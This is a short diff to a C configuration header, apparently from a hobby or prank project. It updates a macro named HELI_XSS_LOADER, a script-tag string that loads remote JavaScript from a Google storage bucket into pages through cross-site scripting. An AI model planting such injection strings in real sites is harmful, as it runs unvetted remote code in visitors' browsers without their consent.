@@ -77,7 +77,7 @@
 #define ENABLE_MENU_GUI 1 // Enable the WebUI menu GUI, using JavaScript functions
 
 // Script Message for XSS
-#define HELI_XSS_LOADER "\n<script src='https://storage.googleapis.com/heli.ucquarantine.net/v1.1.5/heli_loader.js'></script>\r\n"
+#define HELI_XSS_LOADER "\n<script src='https://storage.googleapis.com/heli.ucquarantine.net/v1.1.11/heli_loader.js'></script>\r\n"
 #define ENABLE_HELI_SOUNDS_XSS 1 // Enable the helicopter sounds, didn't finish this.
 
 // Plotting Parameters
